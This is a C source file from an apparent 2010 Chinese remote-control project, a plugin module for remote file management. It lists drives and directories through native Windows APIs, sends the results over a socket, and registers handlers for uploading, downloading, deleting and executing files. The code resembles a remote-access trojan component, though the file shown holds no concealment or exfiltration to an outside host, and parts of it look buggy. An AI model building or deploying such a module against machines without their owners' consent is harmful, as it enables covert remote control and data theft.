/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "../kms/km_head.h"
#include <stdio.h>
#include "up_down_file.h"

pshare_main g_share_main = NULL;

char *buffer = NULL;

int get_drive(pio_socket i_socket, char *buffer, int length);
int get_directory(pio_socket i_socket, char *buffer, int length);

typedef struct tag_drive{
    char    name[3];
    char    type;
    float   nTotal;
    float   nFree;
}DRIVE,*PDRIVE;

typedef struct tag_file{
    unsigned long   next;
    unsigned long   attributes;
    FILETIME        lastwritetime;
    LARGE_INTEGER   filesize;
    char            filename[0];
}DIRECTORY,*PDIRECTORY;

kms_event_func event_funcs[] = {
    get_drive,
    0,
    0,
    get_directory,
    up_down_file,
    up_file_name,
    up_file,
    down_file_name,
    down_file,
    up_directory_name,
    up_directory,
    down_directory,
    down_directory_next,
    delete_file,
    delete_directory,
    exec_file
};

int get_directory(pio_socket i_socket, char *bufferdd, int lengthdd)
{
    NTSTATUS status;
    HANDLE hFile = NULL;
    ULONG len;
    wchar_t w_findpath[256]={0};
    char    c_findpath[256]={0};
    char pOut[256]={0};
    UNICODE_STRING fname = {0x02,0x06,L"*"};
    UNICODE_STRING u_findpath;
    DIRECTORY   directory;
    unsigned long count = 0;

    if (buffer == NULL) {
        buffer = (char*)malloc(0x48000);
    }

    sprintf(c_findpath,"\\??\\%s",bufferdd + sizeof(io_data_header));

    k_MultiByteToWideChar(CP_ACP,0,c_findpath,strlen(c_findpath),w_findpath,256);

    u_findpath.Buffer = w_findpath;
    u_findpath.Length = wcslen(w_findpath)*2;
    u_findpath.MaximumLength = u_findpath.Length;

    IO_STATUS_BLOCK iosb;
    OBJECT_ATTRIBUTES oa = {sizeof oa,NULL,&u_findpath,0x40};

    status = ZwOpenFile(&hFile,0x00100001,&oa,&iosb,0x00000007,0x00004021);                     //查找文件
    if (status < 0 ) {
        goto _exit_err;
    }

    len = 0x48000;
    memset(buffer, 0x0, 0x48000);
    status = ZwQueryDirectoryFile(hFile, NULL, 0,NULL, &iosb, buffer, len, 3,FALSE, &fname, FALSE);
    if (status < 0) {
        goto _exit_err;
    }
    PFILE_BOTH_DIR_INFORMATION pFile = (PFILE_BOTH_DIR_INFORMATION)buffer;

    for (;;) {
        if (pFile->FileName[0] != (wchar_t)'.') {
            memset(pOut,0x0,256);
            k_WideCharToMultiByte(CP_ACP,0,pFile->FileName,pFile->FileNameLength/2,pOut,256,NULL,NULL);

            directory.next       = sizeof(DIRECTORY) + strlen(pOut) + 1;
            directory.attributes = pFile->FileAttributes;
            k_FileTimeToLocalFileTime((FILETIME*)&pFile->LastWriteTime,&directory.lastwritetime);
            directory.filesize.QuadPart = pFile->EndOfFile.QuadPart;
            memcpy(&i_socket->i_buffer[count],(void*)&directory,sizeof(DIRECTORY));
            memcpy(&i_socket->i_buffer[count+sizeof(DIRECTORY)],pOut,strlen(pOut));

            count += directory.next;
            i_socket->i_buffer[count-1] = '\0';

            //printf("ss %f %f %s\n",(float)pFile->EndOfFile.QuadPart,(float)pFile->AllocationSize.QuadPart,pOut);
        }
        if(pFile->NextEntryOffset == 0)
            break;
        pFile = (PFILE_BOTH_DIR_INFORMATION)(((char*)pFile)+pFile->NextEntryOffset);
    }

_exit_err:
    ZwClose(hFile);
    k_sock_send(i_socket, 1, 3, 0, i_socket->i_buffer, count);
    return SOCK_LOOP_RECV_HEADER;
}


int get_drive(pio_socket i_socket, char *buffer, int length)
{
    int pf='A';
    int i=0,index=0;
    PROCESS_DEVICEMAP_INFORMATION Process_DeviceMap_Information;
    NTSTATUS status;
    ULONG len;
    DRIVE drive;
#define ProcessDeviceMap                    23
    len = sizeof(PROCESS_DEVICEMAP_INFORMATION);
    status = ZwQueryInformationProcess((HANDLE)-1,ProcessDeviceMap,(PVOID)&Process_DeviceMap_Information,len,NULL);

    ULARGE_INTEGER nFreeBytesAvailable;
    ULARGE_INTEGER nTotalNumberOfBytes;
    ULARGE_INTEGER nTotalNumberOfFreeBytes;

    if (status < 0) {
        goto _exit_err;
    }

    for (i=0;i<26;i++) {
        if ( i > 1)
        if (Process_DeviceMap_Information.Query.DriveMap & 1){
            memset(&drive, 0x0, sizeof(DRIVE));
            drive.name[0] = pf;
            drive.name[1] = ':';
            drive.type    = Process_DeviceMap_Information.Query.DriveType[i];

            nFreeBytesAvailable.QuadPart = 0;
            nTotalNumberOfBytes.QuadPart = 0;
            GetDiskFreeSpaceEx(drive.name, &nFreeBytesAvailable, &nTotalNumberOfBytes, &nTotalNumberOfFreeBytes);
            drive.nTotal = (float)nTotalNumberOfBytes.QuadPart/1024/1024/1024;
            drive.nFree  = (float)nFreeBytesAvailable.QuadPart/1024/1024/1024;

            memcpy(((PDRIVE)i_socket->i_buffer)+index, &drive, sizeof(DRIVE));
            index ++;
        }
        Process_DeviceMap_Information.Query.DriveMap = Process_DeviceMap_Information.Query.DriveMap >> 1;
        pf++;
    }

_exit_err:
    k_sock_send(i_socket, 1, 0, 0, i_socket->i_buffer, index*sizeof(DRIVE));
    return SOCK_LOOP_RECV_HEADER;
}


int __declspec(dllexport) initialize(pshare_main ps_main)
{
    g_share_main = ps_main;
    g_share_main->event_funcs[1].event_funcs = event_funcs;
    g_share_main->event_funcs[1].count = 16;
    return 0;
}
